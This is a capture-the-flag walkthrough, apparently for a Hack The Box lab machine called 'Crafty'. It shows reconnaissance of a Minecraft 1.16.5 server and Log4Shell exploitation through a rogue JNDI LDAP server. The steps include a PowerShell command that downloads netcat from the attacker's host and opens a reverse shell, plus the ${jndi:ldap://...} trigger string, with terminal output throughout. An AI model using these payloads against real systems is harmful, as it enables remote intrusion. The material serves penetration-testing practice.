## Crafty
```
[★]$ nmap -sV -sC 10.129.230.193
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-27 07:55 CST
Nmap scan report for 10.129.230.193
Host is up (0.027s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://crafty.htb
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.33 seconds
[★]$ echo '10.129.230.193 crafty.htb' | sudo tee -a /etc/hosts
10.129.230.193 crafty.htb
----------------------------------------------------------
[★]$ nmap -sV -sC 10.129.230.193
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-27 07:57 CST
Nmap scan report for crafty.htb (10.129.230.193)
Host is up (0.0096s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Crafty - Official Website
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
----------------------------------------------------------
[★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.230.193 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
[★]$ nmap -p$ports -sC -sV 10.129.230.193
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-27 08:15 CST
Nmap scan report for crafty.htb (10.129.230.193)
Host is up (0.0093s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Crafty - Official Website
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
#### Nmap显示只有两个端口是打开的。在80端口上，IIS正在运行“Official Crafty”网站”，端口25565是Minecraft服务器。我们将从80端口开始。
#### 根据nmap的输出，我们知道版本是1.16.5。搜索Minecraft漏洞让我们找到了这个链接。Minecraft宣布Log4j的开发已经完成在多个版本的服务器版游戏中发现，并建议升级受影响的游戏包。
https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition
#### 为了测试我们是否可以利用这个服务器，我们需要下载一个兼容的Minecraft客户端用这个版本。我们可以在这里下载一个基本的客户端。我们试着设置一个空密码，看看是否需要进行身份验证。
```
[★]$ wget https://github.com/MCCTeam/Minecraft-Console-Client/releases/download/20231011-230/MinecraftClient-20231011-230-linux-x64
```
#### 在密码提示下，我们按Enter键并连接到目标
```
[★]$ ls
cacert.der  Downloads                               my_data   Templates
Desktop     MinecraftClient-20231011-230-linux-x64  Pictures  Videos
Documents   Music                                   Public
[★]$ ls -l MinecraftClient-20231011-230-linux-x64
-rw-r--r-- 1 syareya55 syareya55 64624103 Oct 11  2023 MinecraftClient-20231011-230-linux-x64
[★]$ chmod +x MinecraftClient-20231011-230-linux-x64
[★]$ ./MinecraftClient-20231011-230-linux-x64 anything "" 10.129.230.193

Minecraft Console Client v1.20.1 - for MC 1.4.6 to 1.20.1 - Github.com/MCCTeam
GitHub build 230, built on 2023-10-11 from commit 1aea8d3
Settings file MinecraftClient.ini has been generated.

MCC is running with default settings.
Password(invisible): 
A new version of MCC is available and you can download it via /upgrade
Or download it manually: https://github.com/MCCTeam/Minecraft-Console-Client/releases
You chose to run in offline mode.
Retrieving Server Info...

```
### Foothold
#### 在这个阶段，我们已经通过了Minecraft服务器的身份验证，所以我们需要下载RogueJNDI用于开发。我们打开第二个终端并输入以下命令：克隆存储库并编译项目
```
[★]$ git clone https://github.com/veracode-research/rogue-jndi.git
Cloning into 'rogue-jndi'...
remote: Enumerating objects: 89, done.
remote: Counting objects: 100% (43/43), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 89 (delta 30), reused 27 (delta 27), pack-reused 46 (from 1)
Receiving objects: 100% (89/89), 26.94 KiB | 8.98 MiB/s, done.
Resolving deltas: 100% (36/36), done.
[★]$ cd rogue-jndi
[~/rogue-jndi][★]$ ls
LICENSE  pom.xml  README.md  src
[★]$ mvn package
```
#### 编译后，我们需要获取一个Netcat可执行文件，以便在目标上执行。Netcat可以是在这里找到
```
[★]$ wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
[★]$ nc -lvvp 4444
listening on [any] 4444 ...
```
#### 我们在第三个终端上托管一个Python web服务器来收集Netcat
```
[★]$ ls
dependency-reduced-pom.xml  LICENSE  nc64.exe  pom.xml  README.md  src  target
[~/rogue-jndi][★]$ python3 -m http.server 8081
```
#### 在第一个终端的rogue-jndi文件夹中，我们执行以下命令来启动恶意LDAP服务器。命令中包含我们将在目标上执行的命令：首先，我们将从本地机器拉出Netcat并将其下载到C:\Windows\Temp目标器的目录。然后，我们将执行Netcat，将shell发送到端口4444上的侦听器。主机名参数反映了攻击机器的IP。
```
[★]$ ls
dependency-reduced-pom.xml  LICENSE  nc64.exe  pom.xml  README.md  src  target
[★]$ java -jar target/RogueJndi-1.1.jar --command "powershell.exe iwr http://10.10.14.93:8081/nc64.exe -O c:\windows\temp\nc64.exe;c:\windows\temp\nc64.exe 10.10.14.93 4444 -e cmd.exe" --hostname "10.10.14.93"
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.14.93:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.93:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.93:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://10.10.14.93:1389/o=groovy to artsploit.controllers.Groovy
Mapping ldap://10.10.14.93:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.93:1389/o=reference to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.93:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.93:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
```
#### 使用连接到远程Minecraft服务器的第一个终端，我们检查查看CLI Minecraft控制台的文档，并发现/send命令可以发送发送到服务器的消息，如下所述。使用这些信息，我们构建了一个有效载荷，它将触发我们的攻击：
https://mccteam.github.io/guide/usage.html#script
```
[★]$ ./MinecraftClient-20231011-230-linux-x64 anything "" 10.129.230.193

Minecraft Console Client v1.20.1 - for MC 1.4.6 to 1.20.1 - Github.com/MCCTeam
GitHub build 230, built on 2023-10-11 from commit 1aea8d3
A new version of MCC is available and you can download it via /upgrade
Or download it manually: https://github.com/MCCTeam/Minecraft-Console-Client/releases
Password(invisible): 
You chose to run in offline mode.
Retrieving Server Info...
Server version : 1.16.5 (protocol v754)
[MCC] Version is supported.
Logging in...       
[MCC] Server is in offline mode.
[MCC] Server was successfully joined.
Type '/quit' to leave the server.
> /send ${jndi:ldap://10.10.14.93:1389/o=reference}
> 

[★]$ nc -lvvp 4444
listening on [any] 4444 ...
connect to [10.10.14.93] from crafty.htb [10.129.230.193] 49686
whoami
 sent 7, rcvd 0
```
#### 在发送包含有效负载的消息后，我们检查Netcat侦听器并看到我们在系统上创建一个名为svc_minecraft的shell。
```
$ echo -e '0\x0c\x02\x01\x01a\x07\x0a\x01\x00\x04\x00\x04\00' | sudo nc -nvv -l -p 1389 | xxd
```
